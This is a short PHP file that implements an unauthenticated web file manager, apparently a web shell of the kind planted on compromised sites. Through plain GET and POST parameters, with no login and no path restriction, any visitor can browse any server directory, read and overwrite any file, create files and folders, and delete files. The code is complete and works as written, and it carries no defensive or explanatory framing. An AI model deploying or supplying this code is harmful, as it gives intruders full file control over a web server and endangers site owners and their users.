<style>
  form{
      display:inline;
  }
  textarea{
      padding:10px;
  }
</style>
<?php
if(isset($_GET["f"])&&$_GET["f"]!=null){$f=$_GET["f"];} else{ $f=".";}

echo "root web : ". $_SERVER['DOCUMENT_ROOT'] .'<hr>';

function myfunction($value,$key){
    global $f;
    echo "<a href='?f=".explode("/$value",realpath($f))[0]."/".htmlentities($value)."'>".htmlentities($value)."</a>/";
}

echo "<hr>";

$curFile=$_SERVER['REQUEST_SCHEME'] .'://'. $_SERVER['HTTP_HOST']. explode('?', $_SERVER['REQUEST_URI'], 2)[0];

echo '<form action="" method="post"> <input name="mkdir" style="width:100px;" required> <input type="submit" value="MKDIR"/> </form>';

echo '<form action="" method="post"> <input name="mkfile" style="width:100px;" required> <input type="submit" value="MAKE FILE"/> </form>';

echo "<br>";

if(isset($_GET["edit"])){
    $arrPath=explode("/",dirname(realpath($f)));
    array_walk($arrPath,"myfunction");
    
if (isset($_POST['text'])){
    file_put_contents($f, $_POST['text']);
}
$text = file_get_contents($f);

echo '<form action="" method="post"> <textarea name="text" style="width:100%;height:60%;">'.htmlspecialchars($text).'</textarea> <input type="submit" value="SAVE"/> </form>';
}
else{
    $arrPath=explode("/",realpath($f));
    array_walk($arrPath,"myfunction");
    
    if(isset($_POST["mkfile"])){
        echo file_put_contents($f."/".$_POST["mkfile"],"");
    }
    
    if(isset($_GET["unlink"])){
        unlink($f."/".$_GET["unlink"]);
    }
    
    if(isset($_POST["mkdir"])){
        mkdir($f."/".$_POST["mkdir"]);
    }
    
    echo "<table> <tr> <th>folder</th> <th>izin</th> <th> url </th> <th>options</th> </tr>";
    
    $data = scandir(is_dir($f)?$f:realpath($f));

 foreach ($data as $value) {
  $lastMod=date("d-m-Y H:i.", filemtime("$f/$value"));
  $url= str_replace($_SERVER['DOCUMENT_ROOT'],$_SERVER['REQUEST_SCHEME'] .'://'.$_SERVER['HTTP_HOST'],realpath("$f/$value"));

  if(is_dir("$f/$value")){
    echo "<tr> <td> <a href='?f=$f/".str_replace("&","%26",$value)."'>".htmlentities($value)."</a> </td> <td>".substr(sprintf("%o", fileperms("$f/$value")),-4)." </td> <td> ". $url ." </td> <td> <a href='?f=".str_replace("&","%26",$f)."&rmdir=$value'>delete</a> </td> </tr>";
  }
  else{
    echo "<tr> <td> <a href='?f=".str_replace("&","%26",$f)."/$value&edit=true'>$value</a> </td> <td>".substr(sprintf("%o", fileperms("$f/$value")),-4)." </td> <td> ". $url ." </td>  <td> <a href='?f=".str_replace("&","%26",$f)."&unlink=$value'>delete</a> </td> </tr>"; 
  }
 }
  
echo "</table>";
}

?>
